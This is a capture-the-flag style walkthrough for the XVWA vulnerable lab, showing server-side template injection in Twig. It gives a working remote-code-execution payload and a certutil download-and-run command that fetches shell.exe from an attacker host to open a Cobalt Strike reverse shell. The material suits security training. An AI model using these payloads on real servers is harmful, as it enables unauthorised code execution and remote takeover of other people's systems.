XVWA-WalkThrough
disclaimer
This document is for learning and research purposes only. Please do not use the technical source code in this document for illegal purposes. Any negative impact caused by anyone has nothing to do with me.

Range project address

https://github.com/s4n7h0/xvwa
lab environment

The environment is for reference only

phpstudy
Microsoft Windows 10 Enterprise LTSC - 10.0.17763
VMware® Workstation 15 Pro - 15.0.0 build-10134415
kali 4.19.0-kali3-amd64
CobaltStrike4.1
build/use
Here use phpstudy to build, mysql5.1.60 + php5.2.17 environment

The database needs to manually create the xvwa library, and modify config.php to enter the credentials for the database connection



Server Side Template Injection (SSTI)
Designing HTML pages is made easier as the template engine supports using static template files and replacing variables/placeholders with actual values in the HTML page at runtime. Currently well known and widely used templating engines are Smarty, Twig, Jinja2, FreeMarker and Velocity.

If attackers can inject template directives as user input, and these directives can execute arbitrary code on the server, then they are not far away from server-side template injection attacks.

Visit the page, try to enter ${{1+2}}, according to the server response, the result is $3. From this response, we can surmise that a template engine is being used here, since this matches how they handle {{}} .



According to the prompt, use the POC of the TWIG template engine

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}


Rebound a shell with CS (windows)

CS monitoring



Generate a bounce payload



Upload to kali deployment

python -m SimpleHTTPServer 8000
Execute with payload

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("certutil.exe -urlcache -split -f http://192.168.141.143:8000/shell.exe shell.exe & shell .exe")}}
successfully launched



Check the server directory, there is a shell.exe file
